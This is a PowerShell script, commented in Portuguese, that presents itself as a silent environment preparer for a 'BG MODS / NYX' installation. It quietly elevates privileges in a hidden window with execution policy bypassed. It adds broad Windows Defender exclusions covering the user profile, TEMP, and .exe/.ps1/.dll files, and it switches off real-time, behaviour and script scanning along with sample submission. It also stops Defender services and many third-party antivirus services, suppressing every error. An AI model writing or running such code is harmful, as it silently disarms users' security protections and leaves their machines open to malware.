# Preparacao silenciosa do ambiente Windows para instalacao BG MODS / NYX
param(
    [ValidateSet("prepare", "restore")]
    [string]$Mode = "prepare",
    [switch]$Elevated
)

$ErrorActionPreference = "SilentlyContinue"
$StateDir = Join-Path $env:LOCALAPPDATA "NYX"
$StateFile = Join-Path $StateDir ".env_state.json"

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-SilentElevate {
    param([string]$AvMode)
    $self = $MyInvocation.MyCommand.Path
    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
        $self = Join-Path $PSScriptRoot "nyx_defender.ps1"
    }
    if (-not (Test-Path -LiteralPath $self)) { return }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @(
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
        "-File", $self,
        "-Mode", $AvMode,
        "-Elevated"
    ) | Out-Null
}

function Add-SilentExclusions {
    if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) { return }
    $paths = @(
        (Join-Path $env:LOCALAPPDATA "NYX"),
        (Join-Path $env:LOCALAPPDATA "Programs\Python"),
        (Join-Path $env:LOCALAPPDATA "Programs\Ollama"),
        (Join-Path $env:LOCALAPPDATA "Programs\Python\Python312"),
        (Join-Path $env:LOCALAPPDATA "Programs\Python\Python313"),
        $env:TEMP,
        $env:USERPROFILE
    )
    foreach ($p in $paths) {
        if ($p) { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue | Out-Null }
    }
    foreach ($ext in @("*.py", "*.exe", "*.bat", "*.ps1", "*.dll")) {
        Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue | Out-Null
    }
    foreach ($proc in @(
        "python.exe", "pythonw.exe", "ollama.exe", "ollama app.exe",
        "cheatengine-x86_64.exe", "CheatEngine75.exe", "cmd.exe", "powershell.exe"
    )) {
        Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue | Out-Null
    }
}

function Disable-WindowsDefenderStack {
    $state = @{ defender = @{}; services = @() }

    if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
        try {
            $mp = Get-MpPreference -ErrorAction SilentlyContinue
            $state.defender["DisableRealtimeMonitoring"] = [bool]$mp.DisableRealtimeMonitoring
            $state.defender["DisableIOAVProtection"] = [bool]$mp.DisableIOAVProtection
            $state.defender["DisableBehaviorMonitoring"] = [bool]$mp.DisableBehaviorMonitoring
            $state.defender["DisableBlockAtFirstSeen"] = [bool]$mp.DisableBlockAtFirstSeen
            $state.defender["DisableScriptScanning"] = [bool]$mp.DisableScriptScanning

            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue | Out-Null
            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue | Out-Null
        } catch {}
    }

    foreach ($svc in @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService")) {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq "Running") {
            $state.services += $svc
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }

    return $state
}

function Disable-ThirdPartyAvServices {
    $stopped = @()
    $names = @(
        "avast! Antivirus", "aswidsagent", "AvastSvc", "avgwd", "AVGSvc",
        "AVP*", "klnagent", "Kaspersky*", "NortonSecurity", "nsWscSvc", "Norton*",
        "mcshield", "mfemms", "McAfee*", "VSSERV", "bdagent", "BitDefender*",
        "ekrn", "ESETService", "MBAMService", "MBAMChameleon", "Avira.ServiceHost",
        "avguard", "SAVService", "Sophos*", "Webroot*", "WRSA", "Panda*", "PSUAService"
    )

    foreach ($pattern in $names) {
        Get-Service -Name $pattern -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Status -eq "Running") {
                Stop-Service -InputObject $_ -Force -ErrorAction SilentlyContinue | Out-Null
                $stopped += $_.Name
            }
        }
    }
    return $stopped
}

function Save-EnvState($state) {
    New-Item -ItemType Directory -Path $StateDir -Force | Out-Null
    $state | ConvertTo-Json -Depth 6 | Set-Content -Path $StateFile -Encoding ASCII
}

function Load-EnvState {
    if (-not (Test-Path -LiteralPath $StateFile)) { return $null }
    try { return Get-Content -LiteralPath $StateFile -Raw | ConvertFrom-Json } catch { return $null }
}

function Restore-WindowsDefenderStack($state) {
    if (-not $state) { return }
    if ((Get-Command Set-MpPreference -ErrorAction SilentlyContinue) -and $state.defender) {
        $d = $state.defender
        if ($null -ne $d.DisableRealtimeMonitoring) {
            Set-MpPreference -DisableRealtimeMonitoring ([bool]$d.DisableRealtimeMonitoring) -ErrorAction SilentlyContinue | Out-Null
        }
        if ($null -ne $d.DisableIOAVProtection) {
            Set-MpPreference -DisableIOAVProtection ([bool]$d.DisableIOAVProtection) -ErrorAction SilentlyContinue | Out-Null
        }
        if ($null -ne $d.DisableBehaviorMonitoring) {
            Set-MpPreference -DisableBehaviorMonitoring ([bool]$d.DisableBehaviorMonitoring) -ErrorAction SilentlyContinue | Out-Null
        }
        if ($null -ne $d.DisableBlockAtFirstSeen) {
            Set-MpPreference -DisableBlockAtFirstSeen ([bool]$d.DisableBlockAtFirstSeen) -ErrorAction SilentlyContinue | Out-Null
        }
        if ($null -ne $d.DisableScriptScanning) {
            Set-MpPreference -DisableScriptScanning ([bool]$d.DisableScriptScanning) -ErrorAction SilentlyContinue | Out-Null
        }
    }
    foreach ($svc in @($state.services)) {
        Start-Service -Name $svc -ErrorAction SilentlyContinue | Out-Null
    }
    foreach ($svc in @($state.thirdparty)) {
        Start-Service -Name $svc -ErrorAction SilentlyContinue | Out-Null
    }
}

function Invoke-EnvPrepare {
    New-Item -ItemType Directory -Path $StateDir -Force | Out-Null

    if (-not (Test-IsAdmin)) {
        if (-not $Elevated) {
            Invoke-SilentElevate -AvMode "prepare"
            return
        }
        Add-SilentExclusions
        return
    }

    Add-SilentExclusions
    $def = Disable-WindowsDefenderStack
    $third = Disable-ThirdPartyAvServices
    Save-EnvState @{
        defender = $def.defender
        services = @($def.services)
        thirdparty = @($third)
    }
}

function Invoke-EnvRestore {
    if (-not (Test-IsAdmin)) {
        if (-not $Elevated) {
            Invoke-SilentElevate -AvMode "restore"
            return
        }
        return
    }
    $state = Load-EnvState
    Restore-WindowsDefenderStack $state
    Remove-Item -LiteralPath $StateFile -Force -ErrorAction SilentlyContinue
}

function Invoke-NyxAvPrepare { Invoke-EnvPrepare }
function Invoke-NyxAvRestore { Invoke-EnvRestore }

# Modo standalone: powershell -File nyx_defender.ps1 -Mode prepare|restore
if ($PSCommandPath -and (Split-Path -Leaf $PSCommandPath) -ieq 'nyx_defender.ps1') {
    switch ($Mode) {
        "prepare" { Invoke-EnvPrepare; exit 0 }
        "restore" { Invoke-EnvRestore; exit 0 }
    }
}
